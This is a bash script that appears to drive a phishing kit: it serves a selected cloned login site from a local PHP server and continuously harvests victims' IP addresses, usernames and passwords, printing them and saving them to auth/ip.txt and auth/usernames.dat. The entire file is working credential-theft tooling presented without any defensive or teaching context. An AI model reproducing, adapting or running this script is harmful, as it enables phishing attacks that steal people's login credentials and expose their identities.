#!/bin/bash
HOST='127.0.0.1'
PORT='8080'

exit_on_signal_SIGINT() {
  { printf "\n\n%s\n\n" "[!] Program Interrupted." 2>&1; }
  exit 0
}

exit_on_signal_SIGTERM() {
  { printf "\n\n%s\n\n" "[!] Program Terminated." 2>&1; }
  exit 0
}
trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

if [[ ! -d ".server" ]]; then
  mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
  mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
  rm -rf ".server/www"
  mkdir -p ".server/www"
else
  mkdir -p ".server/www"
fi

setup_site() {
  echo -e "\n[-] Setting up server..."
  cp -rf .sites/"$website"/* .server/www
  cp -f .ip.php .server/www/ip.php
  echo -ne "\n[-] Starting PHP server..."
  cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}
capture_ip() {
  IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
  IFS=$'\n'
  echo -e "\n[-] Victim's IP : $IP"
  echo -ne "\n[-] Saved in : auth/ip.txt"
  cat .server/www/ip.txt >> auth/ip.txt
}
capture_creds() {
  ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
  PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
  IFS=$'\n'
  echo -e "\n[-] Account : $ACCOUNT"
  echo -e "\n[-] Password : $PASSWORD"
  echo -e "\n[-] Saved in : auth/usernames.dat"
  cat .server/www/usernames.txt >> auth/usernames.dat
  echo -ne "\n[-] Waiting for Next Login Info, Ctrl + C to exit. "
}
capture_data() {
  echo -ne "\n[-] Waiting for Login Info, Ctrl + C to exit..."
  while true; do
    if [[ -e ".server/www/ip.txt" ]]; then
      echo -e "\n\n[-] Victim IP Found !"
      capture_ip
      rm -rf .server/www/ip.txt
    fi
    sleep 0.75
    if [[ -e ".server/www/usernames.txt" ]]; then
      echo -e "\n\n[-] Login info Found !!"
      capture_creds
      rm -rf .server/www/usernames.txt
    fi
    sleep 0.75
  done
}
start_localhost() {
  echo -e "\n[-] Initializing... ( http://$HOST:$PORT )"
  setup_site
  echo -e "\n[-] Successfully Hosted at : http://$HOST:$PORT "
  capture_data
}
[[ -z $1 ]] && {
select i in $(ls .sites);do
  [[ -e .sites/"$i" ]] && website=$i && break
done
} || website=$1
start_localhost
